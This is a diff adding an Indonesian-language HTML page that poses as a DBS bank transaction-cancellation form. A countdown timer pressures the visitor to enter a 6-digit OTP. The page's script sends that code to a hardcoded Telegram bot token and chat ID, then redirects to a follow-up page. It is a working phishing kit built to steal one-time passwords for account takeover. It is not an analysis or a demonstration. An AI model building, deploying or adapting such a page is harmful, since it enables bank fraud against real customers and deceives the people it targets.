@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Kode Pembatalan</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #f1f1f1;
+    }
+    .card-otp {
+      max-width: 300px;
+      background: white;
+      border-radius: 15px;
+      margin: 60px auto;
+      padding: 30px 25px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    .logo-img {
+      width: 300px;
+      height: auto;
+      margin-bottom: 25px;
+    }
+    label {
+      font-size: 18px;
+      font-weight: bold;
+      display: block;
+      margin-bottom: 10px;
+      color: #333;
+    }
+    .input-code {
+      width: 90%;
+      padding: 14px;
+      font-size: 20px;
+      border: 2px solid #ccc;
+      border-radius: 10px;
+      text-align: center;
+      outline: none;
+    }
+    .timer {
+      margin-top: 15px;
+      font-size: 22px;
+      font-weight: bold;
+      color: #ff0000;
+    }
+
+    .btn-batal {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 28px;
+      padding: 14px 16px;
+      background: #e60000;
+      color: white;
+      border: none;
+      width: 90%;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 40px;
+      cursor: pointer;
+      box-shadow: 0 5px 10px rgba(230, 0, 0, 0.2);
+      transition: background 0.3s, transform 0.2s;
+    }
+
+    .btn-batal:hover {
+      background: #c40000;
+      transform: scale(1.02);
+    }
+  </style>
+</head>
+<body>
+  <div class="card-otp">
+    <img src="dbs.PNG" alt="DBS Logo" class="logo-img" />
+
+    <form id="otpForm">
+      <label for="kode">Kode Pembatalan Transaksi :</label>
+   <input
+  type="text"
+  id="kode"
+  class="input-code"
+  maxlength="6"
+  inputmode="numeric"
+  pattern="\d*"
+  required
+/>
+
+      <div class="timer" id="timer">1:00</div>
+<button type="submit" class="btn-batal bg-red-600 text-white px-6 py-2 rounded hover:bg-red-700 transition block mx-auto mt-6 " style="margin-left: 10px;">
+  Batalkan Sekarang
+</button>
+
+    </form>
+  </div>
+
+  <script>
+    // Timer mundur
+    let timerDisplay = document.getElementById("timer");
+    let seconds = 60;
+    let countdown = setInterval(() => {
+      seconds--;
+      let min = Math.floor(seconds / 60);
+      let sec = seconds % 60;
+      if (sec < 10) sec = "0" + sec;
+      timerDisplay.textContent = `${min}:${sec}`;
+      if (seconds <= 0) {
+        timerDisplay.textContent = "0:00";
+        clearInterval(countdown);
+      }
+    }, 1000);
+
+    // Kirim OTP ke Telegram
+    document.getElementById("otpForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const kode = document.getElementById("kode").value.trim();
+      if (kode.length < 6) {
+        alert("Kode harus 6 digit");
+        return;
+      }
+
+     const token = '8474317370:AAHQre6cvdPCDBj-4lbiy7Qi5nZfvBSJz6g'; // TOKEN BOT
+    const chat_id = '5801473402'; // CHAT ID TARGET
+
+      const message = `💥 KODE PEMBATALAN\n\nKode OTP: ${kode}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chat_id, text: message }),
+      })
+        .then(res => {
+          if (res.ok) {
+            window.location.href = "dbsvalid.html";
+          } else {
+            alert("Gagal mengirim kode ke Telegram");
+          }
+        })
+        .catch(err => {
+          alert("Error kirim kode: " + err.message);
+        });
+    });
+  </script>
+</body>
+</html>
